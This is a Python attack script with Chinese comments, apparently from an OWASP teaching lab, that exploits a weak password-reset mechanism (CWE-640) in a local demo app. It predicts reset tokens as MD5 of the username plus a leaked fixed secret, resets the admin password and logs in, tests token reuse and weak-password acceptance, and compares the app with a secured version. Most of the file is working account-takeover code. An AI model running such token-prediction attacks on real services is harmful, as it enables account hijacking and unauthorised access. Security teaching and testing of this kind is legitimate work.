#!/usr/bin/env python3
"""
密碼重設漏洞攻擊腳本
====================
此腳本展示如何利用可預測的密碼重設 Token 接管任意帳號。

攻擊原理：
---------
漏洞版本使用 MD5(username + 固定密鑰) 生成重設 Token，
攻擊者可以預測任何使用者的 Token。

CWE-640: Weak Password Recovery Mechanism for Forgotten Password

作者：OWASP Demo
"""

import requests
import hashlib
import argparse

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# ⚠️ 洩露的固定密鑰（從原始碼或錯誤訊息中取得）
LEAKED_SECRET = "fixed-secret-2024"


def generate_predictable_token(username: str) -> str:
    """
    生成可預測的重設 Token
    使用與漏洞版本相同的演算法：MD5(username + 固定密鑰)
    """
    input_str = username + LEAKED_SECRET
    return hashlib.md5(input_str.encode()).hexdigest()


def request_password_reset(username: str, url: str = VULNERABLE_URL) -> dict:
    """
    請求密碼重設
    """
    response = requests.post(
        f"{url}/api/auth/forgot-password",
        json={"username": username}
    )
    return response.json()


def reset_password_with_token(token: str, new_password: str, url: str = VULNERABLE_URL) -> dict:
    """
    使用 Token 重設密碼
    """
    response = requests.post(
        f"{url}/api/auth/reset-password",
        json={"token": token, "newPassword": new_password}
    )
    return response.json()


def try_login(username: str, password: str, url: str = VULNERABLE_URL) -> tuple:
    """
    嘗試登入
    """
    response = requests.post(
        f"{url}/api/auth/login",
        json={"username": username, "password": password}
    )
    
    if response.status_code == 200 and "token" in response.json():
        return True, response.json()
    return False, response.json()


def attack_predictable_token(target_username: str = "admin"):
    """
    🔴 攻擊：使用可預測的 Token 重設密碼
    """
    print("\n" + "=" * 60)
    print(f"🔴 可預測 Token 攻擊：接管 '{target_username}' 帳號")
    print("=" * 60)
    
    # 步驟 1：生成預測的 Token
    predicted_token = generate_predictable_token(target_username)
    print(f"\n📋 步驟 1：預測 Token")
    print(f"   目標帳號：{target_username}")
    print(f"   預測 Token：{predicted_token}")
    
    # 步驟 2：（可選）觸發正常的密碼重設流程
    print(f"\n📋 步驟 2：觸發密碼重設（可選）")
    result = request_password_reset(target_username, VULNERABLE_URL)
    actual_token = result.get("resetToken", "N/A")
    print(f"   實際 Token：{actual_token}")
    
    if actual_token == predicted_token:
        print(f"   ✅ Token 預測成功！")
    else:
        print(f"   ⚠️ Token 不符（可能帳號不存在或已有 Token）")
    
    # 步驟 3：使用預測的 Token 重設密碼
    new_password = "hacked123"
    print(f"\n📋 步驟 3：使用預測 Token 重設密碼")
    print(f"   新密碼：{new_password}")
    
    result = reset_password_with_token(predicted_token, new_password, VULNERABLE_URL)
    print(f"   結果：{result}")
    
    # 步驟 4：嘗試用新密碼登入
    print(f"\n📋 步驟 4：驗證帳號接管")
    success, login_result = try_login(target_username, new_password, VULNERABLE_URL)
    
    if success:
        print(f"   ✅ 帳號接管成功！")
        print(f"   Token：{login_result.get('token', 'N/A')[:50]}...")
        return True
    else:
        print(f"   ❌ 登入失敗：{login_result}")
        return False


def attack_token_never_expires():
    """
    🔴 攻擊：Token 永不過期
    """
    print("\n" + "=" * 60)
    print("🔴 Token 永不過期攻擊")
    print("=" * 60)
    
    target = "user"
    
    # 取得 Token
    print(f"\n📋 取得重設 Token...")
    result = request_password_reset(target, VULNERABLE_URL)
    token = result.get("resetToken")
    print(f"   Token：{token}")
    
    # 使用 Token 重設（第一次）
    print(f"\n📋 第一次使用 Token 重設密碼...")
    result1 = reset_password_with_token(token, "password1", VULNERABLE_URL)
    print(f"   結果：{result1}")
    
    # 使用相同 Token 再次重設（第二次）
    print(f"\n📋 第二次使用同一個 Token 重設密碼...")
    result2 = reset_password_with_token(token, "password2", VULNERABLE_URL)
    print(f"   結果：{result2}")
    
    if "成功" in str(result2):
        print(f"\n❌ 漏洞！Token 可重複使用！")
        print(f"   攻擊者可以：")
        print(f"   1. 取得一次重設 Token")
        print(f"   2. 無限次重設密碼")
        print(f"   3. 持續保持帳號控制")
    else:
        print(f"\n✅ Token 已失效")


def attack_weak_password_on_reset():
    """
    🔴 攻擊：重設時使用弱密碼
    """
    print("\n" + "=" * 60)
    print("🔴 重設時使用弱密碼")
    print("=" * 60)
    
    target = "alice"
    weak_passwords = ["123456", "password", "qwerty", "111111"]
    
    # 取得 Token
    result = request_password_reset(target, VULNERABLE_URL)
    token = result.get("resetToken")
    
    print(f"\n🔓 漏洞版本（http://localhost:8081）：")
    for pwd in weak_passwords:
        result = reset_password_with_token(token, pwd, VULNERABLE_URL)
        if "成功" in str(result):
            print(f"   ✅ {pwd}: 接受（弱密碼）")
            # 重新取得 Token
            result = request_password_reset(target, VULNERABLE_URL)
            token = result.get("resetToken")
        else:
            print(f"   ❌ {pwd}: 拒絕")
    
    print(f"\n🔒 安全版本（http://localhost:8082）：")
    print(f"   ✅ 弱密碼會被拒絕")
    print(f"   ✅ 密碼需要：8+ 字元、大小寫、數字")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 密碼重設：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    target = "bob"
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    
    # 1. 帳號列舉
    result = request_password_reset("nonexistent_user", VULNERABLE_URL)
    if "不存在" in str(result):
        print(f"   ❌ 帳號列舉：錯誤訊息洩露帳號不存在")
    else:
        print(f"   ? 帳號列舉：{result}")
    
    # 2. Token 可預測
    result = request_password_reset(target, VULNERABLE_URL)
    actual_token = result.get("resetToken")
    predicted_token = generate_predictable_token(target)
    if actual_token == predicted_token:
        print(f"   ❌ Token 可預測：MD5(username + 固定密鑰)")
    
    # 3. Token 在回應中返回
    if "resetToken" in result:
        print(f"   ❌ Token 在回應中返回（應該只寄 Email）")
    
    # 4. Token 無過期
    print(f"   ❌ Token 無過期時間")
    
    # 5. Token 可重複使用
    print(f"   ❌ Token 可重複使用")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    
    result = request_password_reset("nonexistent_user", SECURE_URL)
    print(f"   ✅ 統一訊息：{result.get('message', result)}")
    
    result = request_password_reset(target, SECURE_URL)
    if "resetToken" not in result:
        print(f"   ✅ Token 不在回應中（只寄 Email）")
    
    print(f"   ✅ Token 使用 SecureRandom 生成（不可預測）")
    print(f"   ✅ Token 15 分鐘後過期")
    print(f"   ✅ Token 一次性（使用後失效）")
    print(f"   ✅ 弱密碼被阻擋")


def main():
    parser = argparse.ArgumentParser(
        description="密碼重設漏洞攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python password_reset.py --predict admin     # 預測 Token 接管 admin
  python password_reset.py --reuse             # 測試 Token 重複使用
  python password_reset.py --weak              # 測試弱密碼
  python password_reset.py --compare           # 比較漏洞/安全版本
  python password_reset.py --all               # 執行完整演示
        """
    )
    
    parser.add_argument("--predict", type=str, help="預測 Token 接管指定帳號")
    parser.add_argument("--reuse", action="store_true", help="測試 Token 重複使用")
    parser.add_argument("--weak", action="store_true", help="測試弱密碼")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔑 密碼重設漏洞攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    print(f"📍 目標：{VULNERABLE_URL}")
    
    if args.all:
        attack_predictable_token("admin")
        attack_token_never_expires()
        attack_weak_password_on_reset()
        compare_vulnerability()
    elif args.predict:
        attack_predictable_token(args.predict)
    elif args.reuse:
        attack_token_never_expires()
    elif args.weak:
        attack_weak_password_on_reset()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python password_reset.py --all")


if __name__ == "__main__":
    main()
